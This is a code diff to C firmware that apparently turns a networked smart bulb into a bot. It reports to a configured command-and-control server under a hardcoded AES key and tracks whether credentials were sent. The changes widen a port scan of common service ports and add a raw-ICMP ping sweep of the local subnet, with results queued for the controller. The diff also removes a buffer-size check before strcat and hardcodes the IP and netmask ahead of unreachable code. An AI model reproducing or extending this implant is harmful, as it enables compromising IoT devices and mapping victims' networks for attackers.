@@ -3,6 +3,7 @@
 #include <string.h>
 #include "lwip/sockets.h"
 #include "lwip/netif.h"
+#include "lwip/icmp.h"
 #include "mbedtls/aes.h" 
 #include "hal/hal_wifi.h"
 #include "hal/hal_ota.h"
@@ -13,12 +14,12 @@
 #include "new_cfg.h"
 
 
-//#define LOG_FEATURE LOG_FEATURE_MAIN
+#define LOG_FEATURE LOG_FEATURE_MAIN
 
 // --- CONFIGURATION ---
 #define C2_HEARTBEAT_DELAY 5000
-#define BULB_ID "001"
-#define C2_SERVER_IP "10.2.1.10" 
+#define BULB_ID "002"
+#define C2_SERVER_IP "172.222.1.2"//"172.222.1.2" 
 #define C2_SERVER_PORT 8080
 #define C2_PACKET_SIZE 256
 const unsigned char AES_KEY[] = "1234567890123456"; 
@@ -43,7 +44,7 @@ int g_scan_index = 0;
 int g_creds_sent = 0;
 
 // Ports relevant to IoT and Servers
-const uint16_t target_ports[] = {22, 443};
+const uint16_t target_ports[] = {20, 21, 22, 23, 53, 80, 115, 443};
 #define PORT_COUNT (sizeof(target_ports) / sizeof(target_ports[0]))
 
 /**
@@ -92,25 +93,46 @@ void run_port_scan(void *arg) {
         if (g_stop_scan) break;
 
         int sock = socket(AF_INET, SOCK_STREAM, 0);
-        struct timeval tv = {0, 45000}; // 45ms timeout
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+
+        // 1. Set to Non-Blocking
+        int flags = fcntl(sock, F_GETFL, 0);
+        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
 
         struct sockaddr_in addr = {0};
         addr.sin_family = AF_INET;
         addr.sin_port = htons(target_ports[i]);
         addr.sin_addr.s_addr = inet_addr(target_ip);
 
-        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
-            char port_str[10];
-            snprintf(port_str, sizeof(port_str), "%d;", target_ports[i]);
+        // 2. This returns immediately now
+        int res = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+        bool is_open = false;
+        if (res < 0 && errno == EINPROGRESS) {
+            fd_set fdset;
+            FD_ZERO(&fdset);
+            FD_SET(sock, &fdset);
             
-            // Append found port to buffer
-            if (strlen(g_scan_buffer) + strlen(port_str) < sizeof(g_scan_buffer)) {
-                strcat(g_scan_buffer, port_str);
+            struct timeval tv = {0, 45000}; // 45ms "Patience"
+            
+            // 3. Wait for the result
+            res = select(sock + 1, NULL, &fdset, NULL, &tv);
+            
+            if (res > 0) {
+                // Port is open!
+                is_open = true;
             }
         }
-        close(sock);
-        rtos_delay_milliseconds(10); // Watchdog safety
+        else{
+            is_open = true; // Immediate success, likely open
+        }
+        if (is_open) {
+            char port_str[10];
+            snprintf(port_str, sizeof(port_str), "%d;", target_ports[i]);
+            strcat(g_scan_buffer, port_str);
+        }
+
+        // 4. Always close to prevent the socket leak
+        close(sock); 
+        rtos_delay_milliseconds(10);
     }
 
     g_scan_ready = 2; // Signal C2 thread to send the 'portf' (Final) chunk
@@ -151,46 +173,107 @@ void run_wifi_ap_scan() {
     g_scan_ready = 2; // Mark as complete for the C2 drip thread
 }
 
+// Helper to calculate ICMP checksum
+uint16_t icmp_chksum(void *data, int len) {
+    uint32_t sum = 0;
+    uint16_t *ptr = (uint16_t *)data;
+
+    while (len > 1) {
+        sum += *ptr++;
+        len -= 2;
+    }
+    if (len == 1) {
+        sum += *(uint8_t *)ptr;
+    }
+
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    return (uint16_t)(~sum);
+}
+
+bool ping_target(uint32_t target_ip) {
+    target_ip = htonl(target_ip); // Ensure target IP is in network byte order
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sock < 0) return false;
+
+    // Set a very short timeout for the demo
+    struct timeval tv = {0, 200000}; // 200ms
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    ADDLOGF_WARN("Scanning IP: %s", inet_ntoa(*(struct in_addr *)&target_ip));
+    struct icmp_echo_hdr echo_req;
+    echo_req.type = ICMP_ECHO;
+    echo_req.code = 0;
+    echo_req.chksum = 0;
+    echo_req.id = 0x1234;
+    echo_req.seqno = 0;
+    echo_req.chksum = icmp_chksum(&echo_req, sizeof(echo_req));
+
+    struct sockaddr_in servaddr;
+    memset(&servaddr, 0, sizeof(servaddr));
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = target_ip;
+
+    sendto(sock, &echo_req, sizeof(echo_req), 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
+
+    char recv_buf[64];
+    struct sockaddr_in from;
+    socklen_t fromlen = sizeof(from);
+    
+    // If we receive any response, the host is "Up"
+    int ret = recvfrom(sock, recv_buf, sizeof(recv_buf), 0, (struct sockaddr *)&from, &fromlen);
+    close(sock);
+    
+    return (ret > 0);
+}
+
+uint32_t getIPAddr(){
+    return 0xC0A80100;
+    IPStatusTypedef ipStatus;
+    bk_wlan_get_ip_status(&ipStatus, BK_STATION);
+    ip4_addr_t ip;
+    ip4addr_aton(ipStatus.ip, &ip);
+    return ip.addr;
+}
+
+uint32_t getIPMask(){
+    return 0xFFFFFF00;
+    IPStatusTypedef ipStatus;
+    bk_wlan_get_ip_status(&ipStatus, BK_STATION);
+    ip4_addr_t mask;
+    ip4addr_aton(ipStatus.mask, &mask);
+    return mask.addr;
+}
+
 /**
  * IP SCAN: Dynamic Ping Sweep based on local subnet
  */
 void run_ip_ping_sweep() {
     struct netif *net = netif_list;
     if (!net) return;
-
-    uint32_t b_ip = ip4_addr_get_u32(netif_ip4_addr(net));
-    uint32_t b_mask = ip4_addr_get_u32(netif_ip4_netmask(net));
+    uint32_t b_ip = getIPAddr();
+    uint32_t b_mask = getIPMask();
     uint32_t base = b_ip & b_mask;
     uint32_t brdcst = base | (~b_mask);
 
+    g_active_type = 1; // IP
     g_scan_ready = 1;
     memset(g_scan_buffer, 0, sizeof(g_scan_buffer));
 
     for (uint32_t target = base + 1; target < brdcst; target++) {
-		if (g_stop_scan) {
-			bk_printf("[C2] IP Scan Terminated by Server\n");
-			break; 
-    	}
-        struct in_addr addr;
-        addr.s_addr = target;
-        
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        struct timeval tv = {0, 35000}; // 35ms timeout
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+        if (g_stop_scan) break;
 
-        struct sockaddr_in t_addr = {0};
-        t_addr.sin_family = AF_INET;
-        t_addr.sin_port = htons(80);
-        t_addr.sin_addr.s_addr = target;
-
-        if (connect(sock, (struct sockaddr *)&t_addr, sizeof(t_addr)) == 0) {
+        // Convert target to network byte order for the ping function
+        // Use htonl if your loop is incrementing in host byte order
+        if (ping_target(target)) {
+            struct in_addr addr;
+            addr.s_addr = target;
             strcat(g_scan_buffer, inet_ntoa(addr));
             strcat(g_scan_buffer, ";");
         }
-        close(sock);
-        rtos_delay_milliseconds(5);
+        
+        // Important: Feed the watchdog or yield to the OS
+        rtos_delay_milliseconds(5); 
     }
-    g_active_type = 1; // IP
     g_scan_ready = 2;
 }
 
